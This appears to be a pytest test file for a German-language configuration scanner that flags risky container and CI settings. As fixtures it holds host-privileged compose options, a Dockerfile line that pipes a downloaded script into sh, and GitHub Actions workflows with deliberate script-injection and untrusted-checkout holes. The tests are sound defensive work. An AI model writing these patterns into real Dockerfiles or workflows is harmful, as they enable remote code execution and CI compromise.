"""Scanner-Matrix COD-08, COD-09 (Prüfkatalog C14, C15)."""

from pathlib import Path

import pytest

from luibui_scan.analyzers.c_konfig import KonfigCodeAnalyzer
from luibui_scan.context import ScanContext
from luibui_scan.inventory import build_inventory
from luibui_scan.models import Pruefumfang, ScanArt


def found(root: Path, name: str, content: str) -> list[tuple[str, int | None]]:
    (root / name).parent.mkdir(parents=True, exist_ok=True)
    (root / name).write_text(content)
    ctx = ScanContext(
        root=root,
        scan_art=ScanArt.INTENSIV,
        pruefumfang=Pruefumfang.PAKET,
        inventory=build_inventory(root).entries,
    )
    return [(f.rule_id, f.zeile) for f in KonfigCodeAnalyzer().analyze(ctx)]


@pytest.mark.parametrize(
    "service",
    [
        "    privileged: true",
        "    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock",
        "    network_mode: host",
        "    cap_add:\n      - SYS_ADMIN",
        "    volumes:\n      - /:/host",
    ],
)
def test_compose_with_host_rights(tmp_path: Path, service: str) -> None:
    compose = f"services:\n  app:\n    image: x\n{service}\n"
    assert [r for r, _ in found(tmp_path, "docker-compose.yml", compose)] == ["LB-C14-container"]


def test_ordinary_compose(tmp_path: Path) -> None:
    compose = (
        "services:\n  app:\n    image: x\n    ports:\n      - '8000:8000'\n"
        "    volumes:\n      - ./data:/data\n"
    )
    assert found(tmp_path, "compose.yaml", compose) == []


def test_dockerfile_downloading_and_running(tmp_path: Path) -> None:
    df = "FROM python:3.12-slim\nRUN curl -fsSL https://x.invalid/i.sh | sh\n"
    assert found(tmp_path, "Dockerfile", df) == [("LB-C14-container", 2)]


def test_ordinary_dockerfile(tmp_path: Path) -> None:
    df = (
        'FROM python:3.12-slim\nRUN pip install --no-cache-dir uv==0.5\nCMD ["python", "-m", "x"]\n'
    )
    assert found(tmp_path, "Containerfile", df) == []


INJECTION = """on:
  issues:
    types: [opened]
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Neues Issue"
          echo "${{ github.event.issue.title }}"
"""


def test_script_injection(tmp_path: Path) -> None:
    assert found(tmp_path, ".github/workflows/triage.yml", INJECTION) == [
        ("LB-C15-ci-workflow", 10)
    ]


def test_untrusted_text_via_env_is_fine(tmp_path: Path) -> None:
    step = INJECTION[INJECTION.index("      - run: |") :]
    safe = INJECTION.replace(
        step,
        "      - env:\n"
        "          TITLE: ${{ github.event.issue.title }}\n"
        '        run: echo "$TITLE"\n',
    )
    assert found(tmp_path, ".github/workflows/triage.yml", safe) == []


def test_pwn_request(tmp_path: Path) -> None:
    wf = """on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
"""
    assert found(tmp_path, ".github/workflows/ci.yml", wf) == [("LB-C15-ci-workflow", 8)]


def test_ordinary_workflow(tmp_path: Path) -> None:
    wf = (
        "on: [push, pull_request]\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n      - run: npm test\n"
    )
    assert found(tmp_path, ".github/workflows/ci.yml", wf) == []
